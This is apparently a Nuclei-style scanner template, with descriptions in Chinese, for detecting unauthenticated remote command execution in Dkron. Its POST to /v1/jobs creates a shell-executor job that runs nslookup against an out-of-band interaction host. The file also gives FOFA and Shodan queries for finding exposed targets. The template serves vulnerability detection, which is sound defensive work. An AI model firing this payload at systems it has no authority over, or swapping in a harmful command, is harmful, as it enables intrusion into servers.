id: dkron-unauth-rce

info:
  name: Dkron - 未授权 - 远程命令执行漏洞
  author: icarot
  severity: high
  description: |
    该模板用于检测 Dkron - 未授权 - 远程命令执行漏洞。该类漏洞通常源于认证、授权或会话校验逻辑不完整，使未授权用户可访问受保护接口或执行敏感操作。模板会向 `/v1/jobs` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可绕过登录或权限限制，访问管理功能、敏感数据或业务操作接口。
    - 在管理接口暴露的场景下，可能进一步导致配置被篡改、账号被接管或系统被植入后门。
  remediation: |
    - 在服务端统一执行认证和授权校验，避免仅依赖前端控制或可预测参数。
    - 修复存在绕过问题的版本，并限制管理接口、调试接口和敏感 API 的访问来源。
    - 审计异常登录、权限变更和配置修改记录，轮换可能受影响的账号凭据。
  reference:
    - https://github.com/distribworks/dkron/
  metadata:
    verified: true
    fofa-query: title="Dkron"
    shodan-query: title:"Dkron"
  tags: dkron,unauth,rce,oast,oob,vuln

variables:
  string: "{{to_lower(rand_text_alpha(5))}}"

http:
  - raw:
      - |
        POST /v1/jobs HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

        {"ephemeral":true,"disabled":false,"name":"{{string}}","schedule":"@every 1s","executor":"shell","executor_config":{"command":"nslookup  {{string}}.{{interactsh-url}}","cwd":"/tmp/","env":"ENV_VAR=va1,ANOTHER_ENV_VAR=var2","shell":"true","timeout":"10s"},"retries":null}

    matchers:
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'dns')"
          - "contains(content_type, 'application/json')"
          - "contains_all(body, 'success_count','owner_email')"
          - "status_code == 201"
        condition: and
